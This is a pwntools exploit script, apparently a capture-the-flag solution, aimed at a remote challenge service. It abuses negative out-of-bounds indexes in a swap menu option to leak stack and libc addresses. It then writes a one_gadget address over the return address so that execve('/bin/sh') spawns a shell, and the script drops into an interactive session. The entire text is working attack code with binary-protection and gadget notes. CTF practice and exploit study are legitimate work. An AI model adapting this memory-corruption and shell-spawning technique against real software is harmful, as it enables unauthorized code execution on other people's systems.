from pwn import *


libc = ELF("./libc.so.6")
environ = {"LD_PRELOAD":"./libc.so.6"}

p = remote("challs.xmas.htsp.ro", 2002)
"""
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
"""


def swap(a, b):
    p.sendlineafter("Option: ", "1")
    p.sendlineafter(":", str(a))
    p.sendlineafter(":", str(b))

def insert(idx, value):
    p.sendlineafter("Option: ", "3")
    p.sendlineafter(":", str(idx))
    p.sendlineafter(":", str(value))

def print_db():
    ret = []
    p.sendlineafter("Option: ", "2")
    for i in range(8):
        p.recvuntil(f"ID[{i}] = ")
        ret += [int(p.recvline()[:-1])]
    return ret

# stack addr
swap(-(0xfffff + 1 -  0x40//8 ), 0)

# libc leak
ret_addr_off = (0x7fffffffe2f8 - 0x7fffffffe2a0)
swap(-(0xfffff + 1 -  ret_addr_off//8 ), 1)

leaks = print_db()
print(leaks)

libc.address = leaks[1] - 0x21bf7

"""
0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f432 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a41c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

"""

one_gadget = libc.address + 0x4f3d5

insert(1, one_gadget)
swap(-(0xfffff + 1 -  ret_addr_off//8 ), 1)


# now just exit the program


p.interactive()
